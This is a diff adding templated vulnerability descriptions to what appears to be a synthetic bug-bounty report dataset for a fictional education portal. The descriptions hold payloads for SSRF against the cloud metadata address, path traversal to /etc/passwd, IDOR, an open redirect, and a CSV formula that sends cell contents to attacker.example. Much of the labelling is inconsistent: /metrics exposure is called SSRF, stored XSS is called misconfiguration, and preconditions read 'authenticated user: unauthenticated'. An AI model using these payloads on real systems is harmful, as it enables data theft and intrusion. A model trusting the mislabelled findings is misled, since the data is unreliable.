-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://api.waldlicht-bildung.foo/profile`\n- Preconditions: authenticated user: authenticated user; app version: Portal 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1187,7 +1196,8 @@
           "offset": "4d 5h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://portal.waldlicht-bildung.foo/metrics`\n- Preconditions: authenticated user: authenticated user; app version: Mobile 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1289,7 +1299,8 @@
           "offset": "19h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://portal.waldlicht-bildung.foo/statements/`\n- Preconditions: authenticated user: authenticated user; app version: Mobile 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1417,7 +1428,8 @@
           "offset": "7d 16h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://portal.waldlicht-bildung.foo/api/v2/documents/`\n- Preconditions: authenticated user: support agent; app version: Service 1.8\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1549,7 +1561,8 @@
           "offset": "3h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://portal.waldlicht-bildung.foo/admin/queue`\n- Preconditions: authenticated user: citizen; app version: Service 1.8\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -1669,7 +1682,8 @@
           "offset": "13h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://api.waldlicht-bildung.foo/export`\n- Preconditions: authenticated user: support agent; app version: API 2.3\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1813,7 +1827,8 @@
           "offset": "8d 23h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://api.waldlicht-bildung.foo/export`\n- Preconditions: authenticated user: citizen; app version: Console 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1933,7 +1948,8 @@
           "offset": "2d 12h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://portal.waldlicht-bildung.foo/api/import`\n- Preconditions: authenticated user: unauthenticated; app version: Portal 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2063,7 +2079,8 @@
           "offset": "3d 2h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://portal.waldlicht-bildung.foo/metrics`\n- Preconditions: authenticated user: authenticated user; app version: Service 1.8\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2186,7 +2203,8 @@
           "offset": "1d 13h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://portal.waldlicht-bildung.foo/export`\n- Preconditions: authenticated user: authenticated user; app version: Console 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2272,7 +2290,8 @@
           "offset": "1d 15h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://auth.waldlicht-bildung.foo/admin/items`\n- Preconditions: authenticated user: support agent; app version: API 2.3\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -2424,7 +2443,8 @@
           "offset": "8d 6h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://portal.waldlicht-bildung.foo/api/documents/`\n- Preconditions: authenticated user: unauthenticated; app version: Service 1.8\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2536,7 +2556,8 @@
           "offset": "1d 17h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.waldlicht-bildung.foo/fetch`\n- Preconditions: authenticated user: unauthenticated; app version: Web 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2660,7 +2681,8 @@
           "offset": "20h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://portal.waldlicht-bildung.foo/profile`\n- Preconditions: authenticated user: authenticated user; app version: Mobile 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2799,7 +2821,8 @@
           "offset": "3d 5h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://api.waldlicht-bildung.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: support agent; app version: Mobile 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2930,7 +2953,8 @@
           "offset": "1d 20h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.waldlicht-bildung.foo/import`\n- Preconditions: authenticated user: authenticated user; app version: Mobile 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3126,7 +3150,8 @@
           "offset": "7d 23h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.waldlicht-bildung.foo/api/documents/`\n- Preconditions: authenticated user: citizen; app version: Service 1.8\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3277,7 +3302,8 @@
           "offset": "4d 3h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://api.waldlicht-bildung.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: admin; app version: Console 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3402,7 +3428,8 @@
           "offset": "3d 5h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://portal.waldlicht-bildung.foo/metrics`\n- Preconditions: authenticated user: support agent; app version: Auth 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3505,7 +3532,8 @@
           "offset": "2d 2h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://api.waldlicht-bildung.foo/statements/`\n- Preconditions: authenticated user: unauthenticated; app version: API v2\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3644,7 +3672,8 @@
           "offset": "3d 14h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://auth.waldlicht-bildung.foo/auth/callback?next=https://evil.foo`\n- Preconditions: authenticated user: citizen; app version: Web 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3767,7 +3796,8 @@
           "offset": "3d 4h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://auth.waldlicht-bildung.foo/v2/me`\n- Preconditions: authenticated user: radiologist; app version: API 2.3\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3907,7 +3937,8 @@
           "offset": "3d 19h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://auth.waldlicht-bildung.foo/export?type=records`\n- Preconditions: authenticated user: unauthenticated; app version: Console 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3988,7 +4019,8 @@
           "offset": "0h",
           "message": "Initial submission with PoC and reproduction steps."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.waldlicht-bildung.foo/metrics`\n- Preconditions: authenticated user: authenticated user; app version: Portal 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4136,7 +4168,8 @@
           "offset": "6d 18h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://www.waldlicht-bildung.foo/api/documents/`\n- Preconditions: authenticated user: support agent; app version: Portal 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4259,7 +4292,8 @@
           "offset": "4d 10h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://www.waldlicht-bildung.foo/import`\n- Preconditions: authenticated user: authenticated user; app version: Auth 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4373,7 +4407,8 @@
           "offset": "0h",
           "message": "Minimal PoC attached; scope limited to in-scope assets."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.waldlicht-bildung.foo/metrics`\n- Preconditions: authenticated user: support agent; app version: Portal 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4521,7 +4556,8 @@
           "offset": "3d 5h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.waldlicht-bildung.foo/api/documents/`\n- Preconditions: authenticated user: unauthenticated; app version: Console 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4681,7 +4717,8 @@
           "offset": "6d 18h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://www.waldlicht-bildung.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: unauthenticated; app version: API 2.3\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4797,7 +4834,8 @@
           "offset": "6d 2h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://www.waldlicht-bildung.foo/auth/callback?next=https://evil.foo`\n- Preconditions: authenticated user: radiologist; app version: Service 1.8\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4951,7 +4989,8 @@
           "offset": "4d 19h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://auth.waldlicht-bildung.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: radiologist; app version: Portal 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5062,7 +5101,8 @@
           "offset": "0h",
           "message": "Minimal PoC attached; scope limited to in-scope assets."
         }
-      ]
+      ],
